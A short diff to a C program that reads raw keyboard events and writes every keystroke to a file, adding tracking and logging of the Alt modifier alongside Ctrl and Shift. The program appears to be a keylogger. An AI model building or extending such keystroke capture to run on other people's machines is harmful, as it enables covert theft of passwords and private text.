@@ -26,6 +26,7 @@ char block_keymap[58] = {
 
 int ctrl_pressed = 0;
 int shift_pressed = 0;
+int alt_pressed = 0;
 int caps_lock_on = 0;
 
 char *getEvent();
@@ -65,7 +66,9 @@ int main() {
                     ctrl_pressed = 1;
                 } else if (ev.code == 42 || ev.code == 54) {
                     shift_pressed = 1;
-                } else if (ev.code == 58) {
+                } else if (ev.code == 56) {
+                    alt_pressed = 1;
+                }else if (ev.code == 58) {
                     caps_lock_on = !caps_lock_on;
                 } else {
                     char ch = keycode_to_char(ev.code, shift_pressed);
@@ -74,6 +77,8 @@ int main() {
                             fprintf(fp, "Ctrl+%c\n", ch);
                         }else if (shift_pressed) {
                             fprintf(fp, "Shift+%c\n", ch);
+                        }else if (alt_pressed) {
+                            fprintf(fp, "Alt+%c\n", ch);
                         }
                         else {
                             fprintf(fp, "%c", ch);
